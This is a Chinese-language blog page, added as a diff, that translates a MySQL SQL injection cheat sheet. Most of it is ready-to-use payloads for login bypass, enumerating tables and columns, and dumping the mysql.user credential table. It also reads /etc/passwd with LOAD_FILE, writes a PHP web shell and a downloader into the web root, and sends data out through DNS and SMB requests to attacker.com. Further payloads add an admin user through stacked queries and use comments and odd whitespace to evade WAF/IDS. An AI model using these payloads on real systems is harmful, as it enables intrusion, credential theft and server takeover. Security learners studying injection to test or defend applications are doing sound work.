@@ -1,0 +1,1207 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="SQLi,翻译," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="翻译：SQL注入之MySQL篇。">
+<meta name="keywords" content="SQLi,翻译">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi MySQL基础知识">
+<meta property="og:url" content="http://yoursite.com/2018/03/19/SQLi_Mysql/index.html">
+<meta property="og:site_name" content="Sec-note">
+<meta property="og:description" content="翻译：SQL注入之MySQL篇。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-03-28T02:15:14.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQLi MySQL基础知识">
+<meta name="twitter:description" content="翻译：SQL注入之MySQL篇。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/19/SQLi_Mysql/"/>
+
+
+
+
+
+  <title>SQLi MySQL基础知识 | Sec-note</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-note</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/19/SQLi_Mysql/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sec-note">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-note">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQLi MySQL基础知识</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-19T15:54:24+08:00">
+                2018-03-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/翻译/" itemprop="url" rel="index">
+                    <span itemprop="name">翻译</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>翻译：SQL注入之MySQL篇。</p>
+<a id="more"></a>
+<h5 id="SQLi-Mysql-基础知识"><a href="#SQLi-Mysql-基础知识" class="headerlink" title="SQLi Mysql 基础知识"></a><a href="https://websec.ca/kb/sql_injection" target="_blank" rel="noopener">SQLi Mysql 基础知识</a></h5><h5 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h5><h5 id="Mysql-注入文章"><a href="#Mysql-注入文章" class="headerlink" title="Mysql 注入文章"></a>Mysql 注入文章</h5><h6 id="drops-gt-Mysql注入科普"><a href="#drops-gt-Mysql注入科普" class="headerlink" title="drops-&gt;Mysql注入科普"></a><a href="http://cb.drops.wiki/drops/tips-123.html" target="_blank" rel="noopener">drops-&gt;Mysql注入科普</a></h6><h6 id="drops-gt-Mysql注入技巧"><a href="#drops-gt-Mysql注入技巧" class="headerlink" title="drops-&gt;Mysql注入技巧"></a><a href="http://cb.drops.wiki/drops/tips-7299.html" target="_blank" rel="noopener">drops-&gt;Mysql注入技巧</a></h6><h6 id="drops-gt-Mysql报错注入原理"><a href="#drops-gt-Mysql报错注入原理" class="headerlink" title="drops-&gt;Mysql报错注入原理"></a><a href="http://cb.drops.wiki/drops/tips-14312.html" target="_blank" rel="noopener">drops-&gt;Mysql报错注入原理</a></h6><h6 id="drops-Mysql-Trigger"><a href="#drops-Mysql-Trigger" class="headerlink" title="drops-Mysql Trigger"></a><a href="http://cb.drops.wiki/drops/tips-3435.html" target="_blank" rel="noopener">drops-Mysql Trigger</a></h6><h6 id="详解Mysql安全配置"><a href="#详解Mysql安全配置" class="headerlink" title="详解Mysql安全配置"></a><a href="http://www.freebuf.com/articles/database/36777.html" target="_blank" rel="noopener">详解Mysql安全配置</a></h6><h6 id="从安全角度深入理解MySQL编码转换机制"><a href="#从安全角度深入理解MySQL编码转换机制" class="headerlink" title="从安全角度深入理解MySQL编码转换机制"></a><a href="http://www.freebuf.com/articles/web/154932.html" target="_blank" rel="noopener">从安全角度深入理解MySQL编码转换机制</a></h6><h6 id="MySQL-数据库安全加固"><a href="#MySQL-数据库安全加固" class="headerlink" title="MySQL 数据库安全加固"></a><a href="https://vxhly.github.io/2016/10/mysql-database-user-policy/" target="_blank" rel="noopener">MySQL 数据库安全加固</a></h6><h5 id="默认数据库"><a href="#默认数据库" class="headerlink" title="默认数据库"></a>默认数据库</h5><table>
+<thead>
+<tr>
+<th>数据库名字</th>
+<th>条件         </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>     mysql</td>
+<td>需要root权限</td>
+</tr>
+<tr>
+<td>information_schema</td>
+<td>Mysql &gt;= 5.0   </td>
+</tr>
+</tbody>
+</table>
+<h5 id="测试注入"><a href="#测试注入" class="headerlink" title="测试注入"></a>测试注入</h5><p>错误意味这这个查询请求是无效的(显示Mysql/在网站中不显示内容)</p>
+<p>正确意味这个查询是有效的(如正常一样有内容展示)</p>
+<p><strong>字符型</strong></p>
+<pre><code>Given the query SELECT * FROM Table WHERE id = &apos;1&apos;;
+
+&apos;    False
+&apos;&apos;    True
+&quot;    False
+&quot;&quot;    True
+\    False
+\\    True
+
+例子：
+SELECT * FROM Articles WHERE id = &apos;1&apos;&apos;&apos;;
+SELECT 1 FROM dual WHERE 1 = &apos;1&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;UNION SELECT &apos;2&apos;;
+
+注意：
+
+* 只要它们配对，就可以使用尽可能多的撇号和引号
+* 可以在引号之后继续拼接语句
+* 引号逃逸引号
+</code></pre><p><strong>数字型</strong></p>
+<pre><code>Given the query SELECT * FROM Table WHERE id = 1;
+
+AND 1    True
+AND 0    False
+AND true    True
+AND false    False
+1-false    Returns 1 if vulnerable
+1-true    Returns 0 if vulnerable
+1*56    Returns 56 if vulnerable
+1*56    Returns 1 if not vulnerable
+
+Example:
+SELECT * FROM Users WHERE id = 3-2;
+Notes:
+
+true is equal to 1.
+false is equal to 0.
+</code></pre><p><strong>万能密码</strong></p>
+<pre><code>Given the query SELECT * FROM Table WHERE username = &apos;&apos;;
+
+&apos; OR &apos;1
+&apos; OR 1 -- -
+&quot; OR &quot;&quot; = &quot;
+&quot; OR 1 = 1 -- -
+&apos;=&apos;
+&apos;LIKE&apos;
+&apos;=0--+
+
+Example:
+SELECT * FROM Users WHERE username = &apos;Mike&apos; AND password = &apos;&apos; OR &apos;&apos; = &apos;&apos;;
+</code></pre><h5 id="注释查询"><a href="#注释查询" class="headerlink" title="注释查询"></a>注释查询</h5><p>以下内容可以注释掉语句</p>
+<table>
+<thead>
+<tr>
+<th>注释符</th>
+<th>意义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>#</td>
+<td>Hash comment</td>
+</tr>
+<tr>
+<td>/*</td>
+<td>C-style comment</td>
+</tr>
+<tr>
+<td>– -</td>
+<td>SQL comment</td>
+</tr>
+<tr>
+<td>;%00</td>
+<td>Nullbyte 空子节</td>
+</tr>
+<tr>
+<td>`</td>
+<td>反引号</td>
+</tr>
+</tbody>
+</table>
+<p>例子：</p>
+<pre><code>SELECT * FROM Users WHERE username = &apos;&apos; OR 1=1 -- -&apos; AND password = &apos;&apos;;
+SELECT * FROM Users WHERE id = &apos;&apos; UNION SELECT 1, 2, 3`&apos;;    
+</code></pre><p>注意：</p>
+<p>当用作别名时，反引号只能用于结束查询。</p>
+<h5 id="测试数据库版本"><a href="#测试数据库版本" class="headerlink" title="测试数据库版本"></a>测试数据库版本</h5><p><strong>变量</strong></p>
+<pre><code>VERSION()
+@@VERSION
+@@GLOBAL.VERSION
+
+Example:
+SELECT * FROM Users WHERE id = &apos;1&apos; AND MID(VERSION(),1,1) = &apos;5&apos;;
+Note:
+
+Output will contain -nt-log in case the DBMS runs on a Windows based machine.
+</code></pre><p><strong>具体代码</strong></p>
+<pre><code>/*!VERSION Specific Code*/
+
+Example:
+Given the query SELECT * FROM Users limit 1,{INJECTION POINT};
+
+1 /*!50094eaea*/;    False - version is equal or greater than 5.00.94
+1 /*!50096eaea*/;    True - version is lesser than 5.00.96
+1 /*!50095eaea*/;    False - version is equal to 5.00.95
+
+Note:
+
+在由于注入位置而无法向查询添加SQL的情况下，确定版本可能有用。有关特定的Mysql代码，可以查看特定Mysql代码。
+</code></pre><h5 id="数据库凭证"><a href="#数据库凭证" class="headerlink" title="数据库凭证"></a>数据库凭证</h5><pre><code>表 | mysql.user    mysql&gt; select * from  mysql.user\G;
+列 | user,password
+当前用户 | user(), current_user(), current_user, system_user(), session_user()
+</code></pre><p><strong>例子</strong></p>
+<pre><code>SELECT current_user;
+SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = &apos;root&apos;-- (Privileged)
+</code></pre><h5 id="数据库名字"><a href="#数据库名字" class="headerlink" title="数据库名字"></a>数据库名字</h5><pre><code>表 | information_schema.schemata, mysql.db
+列 | schema_name, db
+当前数据库 | database(), schema()从表名中查找列
+</code></pre><p><strong>举例</strong></p>
+<pre><code>SELECT database();
+SELECT schema_name FROM information_schema.schemata;
+SELECT DISTINCT(db) FROM mysql.db;-- (Privileged)
+</code></pre><h5 id="服务器主机"><a href="#服务器主机" class="headerlink" title="服务器主机"></a>服务器主机</h5><pre><code>@@HOSTNAME
+</code></pre><p><strong>举例</strong></p>
+<pre><code>SELECT @@hostname;
+</code></pre><h5 id="服务器MAC地址"><a href="#服务器MAC地址" class="headerlink" title="服务器MAC地址"></a>服务器MAC地址</h5><p>通用唯一标识符是一个128位数字，最后12位数字由接口MAC地址形成。</p>
+<pre><code>UUID()
+</code></pre><p>最后十二位是<code>MAC</code>地址。</p>
+<pre><code>mysql&gt; select uuid();
++--------------------------------------+
+| uuid()                               |
++--------------------------------------+
+| cad2fe78-2b67-11e8-af12-00acc7375d92 |
++--------------------------------------+
+</code></pre><p>某些操作系统可能会返回一个48位随机字符串，而不是MAC地址。</p>
+<h5 id="表和列"><a href="#表和列" class="headerlink" title="表和列"></a>表和列</h5><p><strong>确定列数</strong></p>
+<p><strong>Order/Group By</strong></p>
+<pre><code>GROUP/ORDER BY n+1;
+注意：
+逐步的增加这个数字直到出现一个错误的响应
+
+即使GROUP BY和ORDER BY在SQL中具有不同的funcionality，但它们都可以以完全相同的方式用于确定查询中的列数。
+</code></pre><p><strong>举例</strong></p>
+<pre><code>Given the query SELECT username, password, permission FROM Users WHERE id = &apos;{INJECTION POINT}&apos;;
+
+1&apos; ORDER BY 1--+    True
+1&apos; ORDER BY 2--+    True
+1&apos; ORDER BY 3--+    True
+1&apos; ORDER BY 4--+    False - Query is only using 3 columns
+-1&apos; UNION SELECT 1,2,3--+    True
+</code></pre><p><strong>Error Based</strong></p>
+<pre><code>GROUP/ORDER BY 1,2,3,4,5...
+
+与以前的方法类似，如果启用了错误显示，我们可以检查具有1个请求的列数。
+</code></pre><p><strong>举例</strong></p>
+<pre><code>Given the query SELECT username, password, permission FROM Users WHERE id = &apos;{INJECTION POINT}&apos;
+
+1&apos; GROUP BY 1,2,3,4,5--+    Unknown column &apos;4&apos; in &apos;group statement&apos;
+1&apos; ORDER BY 1,2,3,4,5--+    Unknown column &apos;4&apos; in &apos;order clause&apos;
+</code></pre><p><strong>Error Based2</strong></p>
+<pre><code>SELECT ... INTO var_list, var_list1, var_list2...
+
+如果启用了错误显示，则此方法有效
+当注入位于LIMIT字句之后，查找列数有用
+</code></pre><p><strong>例子</strong></p>
+<pre><code>Given the query SELECT permission FROM Users WHERE id = {INJECTION POINT};
+
+-1 UNION SELECT 1 INTO @,@,@    The used SELECT statements have a different number of columns
+-1 UNION SELECT 1 INTO @,@    The used SELECT statements have a different number of columns
+-1 UNION SELECT 1 INTO @    No error means query uses 1 column
+</code></pre><p><strong>例子2</strong></p>
+<pre><code>Given the query SELECT username, permission FROM Users limit 1,{INJECTION POINT};
+
+1 INTO @,@,@    The used SELECT statements have a different number of columns
+1 INTO @,@    No error means query uses 2 columns。没有错误则代表2列
+</code></pre><p><strong>Error Based3</strong></p>
+<pre><code>AND (SELECT * FROM SOME_EXISTING_TABLE) = 1
+
+Notes:
+
+条件是：知道了表名且启用了错误显示，则此功能可用
+它将返回表中的列数，而不是查询
+
+Example:
+Given the query SELECT permission FROM Users WHERE id = {INJECTION POINT};
+
+1 AND (SELECT * FROM Users) = 1    Operand should contain 3 column(s)
+</code></pre><p><strong>检索表</strong></p>
+<p><strong>Union</strong></p>
+<pre><code>UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;
+
+提示：
+version=10 代表 Mysql 5 
+</code></pre><p><strong>Blind</strong></p>
+<pre><code>AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; &apos;A&apos;
+</code></pre><p><strong>Error</strong></p>
+<pre><code>AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))
+
+(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);
+
+AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));-- Available in 5.1.5
+</code></pre><p><strong>检索列</strong></p>
+<p><strong>union</strong></p>
+<pre><code>UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &apos;tablename&apos;
+</code></pre><p><strong>Blind</strong></p>
+<pre><code>AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; &apos;A&apos;
+</code></pre><p><strong>Error</strong></p>
+<pre><code>AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2)))
+
+(@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0);
+
+AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));-- Available in MySQL 5.1.5
+
+AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- Fixed in MySQL 5.1
+
+AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b) a)
+
+AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b USING (SOME_EXISTING_COLUMN)) a)
+</code></pre><p><strong>PROCEDURE ANALYSE()</strong> 程序分析</p>
+<pre><code>PROCEDURE ANALYSE()
+
+注意：
+Web应用程序需要在要注入的SQL查询中显示所选列之一。
+
+例子：
+
+Given the query SELECT username, permission FROM Users WHERE id = 1;
+
+1 PROCEDURE ANALYSE()    Get the first column&apos;s name
+1 LIMIT 1,1 PROCEDURE ANALYSE()    Get the second column&apos;s name
+1 LIMIT 2,1 PROCEDURE ANALYSE()    Get the third column&apos;s name
+</code></pre><p><strong>一次检索出大量的表和列</strong></p>
+<pre><code>SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&gt;=@) AND (@)IN (@:=CONCAT(@,0x0a,&apos; [ &apos;,table_schema,&apos; ] &gt;&apos;,table_name,&apos; &gt; &apos;,column_name))))x
+</code></pre><p><strong>Example:</strong></p>
+<pre><code>SELECT * FROM Users WHERE id = &apos;-1&apos; UNION SELECT 1, 2, (SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&gt;=@) AND (@)IN (@:=CONCAT(@,0x0a,&apos; [ &apos;,table_schema,&apos; ] &gt;&apos;,table_name,&apos; &gt; &apos;,column_name))))x), 4--+&apos;;
+</code></pre><p><strong>Output:</strong></p>
+<pre><code>[ information_schema ] &gt;CHARACTER_SETS &gt; CHARACTER_SET_NAME
+[ information_schema ] &gt;CHARACTER_SETS &gt; DEFAULT_COLLATE_NAME
+[ information_schema ] &gt;CHARACTER_SETS &gt; DESCRIPTION
+[ information_schema ] &gt;CHARACTER_SETS &gt; MAXLEN
+[ information_schema ] &gt;COLLATIONS &gt; COLLATION_NAME
+[ information_schema ] &gt;COLLATIONS &gt; CHARACTER_SET_NAME
+[ information_schema ] &gt;COLLATIONS &gt; ID
+[ information_schema ] &gt;COLLATIONS &gt; IS_DEFAULT
+[ information_schema ] &gt;COLLATIONS &gt; IS_COMPILED
+
+
+SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns
+</code></pre><p><strong>Example:</strong></p>
+<pre><code>SELECT username FROM Users WHERE id = &apos;-1&apos; UNION SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns--+&apos;;
+</code></pre><p><strong>Output:</strong></p>
+<pre><code>Table: talk_revisions
+Column: revid
+
+Table: talk_revisions
+Column: userid
+
+Table: talk_revisions
+Column: user
+
+Table: talk_projects
+Column: priority
+</code></pre><p><strong>从列名中查找表</strong></p>
+<pre><code>SELECT table_name FROM information_schema.columns WHERE column_name = &apos;username&apos;;    Finds the table names for any columns named username.
+SELECT table_name FROM information_schema.columns WHERE column_name LIKE &apos;%user%&apos;;    Finds the table names for any columns that contain the word user.
+</code></pre><p><strong>从表名中查找列</strong></p>
+<pre><code>    SELECT column_name FROM information_schema.columns WHERE table_name = &apos;Users&apos;;          |   Finds the columns for the Users table.
+SELECT column_name FROM information_schema.columns WHERE table_name LIKE &apos;%user%&apos;;|Finds the column names for any tables that contain the word user.
+</code></pre><p><strong>查看当前查询</strong></p>
+<pre><code>SELECT info FROM information_schema.processlist    Available starting from MySQL 5.1.7
+</code></pre><h5 id="转义-避免使用引号"><a href="#转义-避免使用引号" class="headerlink" title="转义(避免使用引号)"></a>转义(避免使用引号)</h5><pre><code>SELECT * FROM Users WHERE username = 0x61646D696E    Hex encoding.
+SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)    CHAR() Function.
+</code></pre><h5 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h5><pre><code>SELECT &apos;a&apos; &apos;d&apos; &apos;mi&apos; &apos;n&apos;;
+SELECT CONCAT(&apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);
+SELECT CONCAT_WS(&apos;&apos;, &apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);
+SELECT GROUP_CONCAT(&apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);
+</code></pre><p>注意</p>
+<p>如果其任何参数为NULL，CONCAT()将返回NULL。改用CONCAT_WS()。<br>CONCAT_WS()的第一个参数为其参数的其余部分定义了分隔符。</p>
+<h5 id="条件声明"><a href="#条件声明" class="headerlink" title="条件声明"></a>条件声明</h5><pre><code>CASE
+IF()
+IFNULL()
+NULLIF()
+</code></pre><p>例子：</p>
+<pre><code>SELECT IF(1=1, true, false);
+SELECT CASE WHEN 1=1 THEN true ELSE false END;
+</code></pre><h5 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h5><pre><code>SLEEP()    MySQL 5
+BENCHMARK()    MySQL 4/5
+</code></pre><p>例子：</p>
+<pre><code>&apos; - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(&apos;true&apos;)), false)) - &apos;
+</code></pre><h5 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h5><p><strong>文件权限</strong></p>
+<p>以下的查询可以帮助查看文件权限是否分配给用户</p>
+<pre><code>SELECT file_priv FROM mysql.user WHERE user = &apos;username&apos;;    Root privileges required    MySQL 4/5
+SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = &apos;file&apos; AND grantee like &apos;%username%&apos;;    No privileges required    MySQL 5
+</code></pre><h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><p>用户如果具有文件权限，可以读取相应信息。</p>
+<pre><code>LOAD_FILE()
+</code></pre><p>例子：</p>
+<pre><code>SELECT LOAD_FILE(&apos;/etc/passwd&apos;);
+SELECT LOAD_FILE(0x2F6574632F706173737764);
+</code></pre><p>注意：</p>
+<ol>
+<li>文件必须位于服务器主机上</li>
+<li>LOAD_FILE()的基本目录是@@datadir</li>
+<li>文件对Mysql用户必须是可读权限</li>
+<li>文件大小必须小于max_allowed_packet</li>
+<li>max_allowed_pa​​cket的默认大小为1047552字节</li>
+</ol>
+<h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><p>如果用户具有文件权限，可以创建新文件。</p>
+<pre><code>INTO OUTFILE/DUMPFILE
+</code></pre><p><strong>例子</strong></p>
+<pre><code>To write a PHP shell:
+SELECT &apos;&lt;? system($_GET[\&apos;c\&apos;]); ?&gt;&apos; INTO OUTFILE &apos;/var/www/shell.php&apos;;
+
+and then access it at:
+http://localhost/shell.php?c=cat%20/etc/passwd
+To write a downloader:
+SELECT &apos;&lt;? fwrite(fopen($_GET[f], \&apos;w\&apos;), file_get_contents($_GET[u])); ?&gt;&apos; INTO OUTFILE &apos;/var/www/get.php&apos;
+
+and then access it at:
+http://localhost/get.php?f=shell.php&amp;u=http://localhost/c99.txt
+</code></pre><p><strong>注意</strong></p>
+<ol>
+<li>文件不能用 <code>INTO OUTFILE</code>覆盖</li>
+<li>INTO OUTFILE必须是查询中的最后一个语句。</li>
+<li>无法对路径名进行编码，因此需要引号。</li>
+</ol>
+<h5 id="带外通道"><a href="#带外通道" class="headerlink" title="带外通道"></a>带外通道</h5><p><strong>DNS 请求</strong></p>
+<pre><code>SELECT LOAD_FILE(CONCAT(&apos;\\\\foo.&apos;,(select MID(version(),1,1)),&apos;.attacker.com\\&apos;));
+</code></pre><p><strong>SMB 请求</strong></p>
+<pre><code>&apos; OR 1=1 INTO OUTFILE &apos;\\\\attacker\\SMBshare\\output.txt
+</code></pre><h5 id="堆积查询"><a href="#堆积查询" class="headerlink" title="堆积查询"></a>堆积查询</h5><p>根据PHP应用程序使用哪个驱动程序与数据库进行通信，MySQL可以进行堆栈查询。 </p>
+<p>PDO_MYSQL驱动程序支持堆栈查询。 MySQLi（改进的扩展）驱动程序还通过multi_query(）函数支持堆栈查询。</p>
+<p><strong>例子</strong></p>
+<pre><code>SELECT * FROM Users WHERE ID=1 AND 1=0; INSERT INTO Users(username, password, priv) VALUES (&apos;BobbyTables&apos;, &apos;kl20da$$&apos;,&apos;admin&apos;);
+SELECT * FROM Users WHERE ID=1 AND 1=0; SHOW COLUMNS FROM Users;
+</code></pre><h5 id="MySQL特定的代码"><a href="#MySQL特定的代码" class="headerlink" title="MySQL特定的代码"></a>MySQL特定的代码</h5><p>MySQL允许你在感叹号后指定版本号。注释中的语法仅在版本大于或等于指定的版本号时执行。</p>
+<p><strong>例子</strong></p>
+<pre><code>UNION SELECT /*!50000 5,null;%00*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+
+SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);
+</code></pre><p><strong>注意</strong></p>
+<ol>
+<li>第一个例子返回版本; 它使用2列的UNION。</li>
+<li>第二个例子演示了如何绕过WAF / IDS。</li>
+</ol>
+<h5 id="模糊和混淆"><a href="#模糊和混淆" class="headerlink" title="模糊和混淆"></a>模糊和混淆</h5><p>以下的字符可以被当作空格。</p>
+<pre><code>09    Horizontal Tab  水平Tab
+0A    New Line   新的一行
+0B    Vertical Tab  垂直Tab
+0C    New Page     新的一页
+0D    Carriage Return  回车
+A0    Non-breaking Space 不间断空格
+20    Space  空格
+</code></pre><p><strong>例子</strong></p>
+<pre><code>&apos;%0A%09UNION%0CSELECT%A0NULL%20%23
+</code></pre><p>圆括号也可以用来避免使用空格。</p>
+<pre><code>28    (
+29    )
+</code></pre><p><strong>例子</strong></p>
+<pre><code>UNION(SELECT(column)FROM(table))
+</code></pre><p><strong>AND/OR后面的一些中间字符</strong></p>
+<pre><code>20    Space
+2B    +
+2D    -
+7E    ~
+21    !
+40    @
+</code></pre><p><strong>例子</strong></p>
+<pre><code>SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))
+</code></pre><p>注意：</p>
+<pre><code>dual是一个可用于测试的虚拟表。
+</code></pre><p><strong>注释混淆</strong></p>
+<p>评论可以用来分解查询来欺骗WAF/IDS并避免检测。 通过使用＃或 - 后跟一个换行符，我们可以将查询拆分为单独的行。</p>
+<p><strong>例子</strong></p>
+<pre><code>1&apos;# 
+AND 0-- 
+UNION# I am a comment! 
+SELECT@tmp:=table_name x FROM-- 
+`information_schema`.tables LIMIT 1# 
+</code></pre><p>URL编码</p>
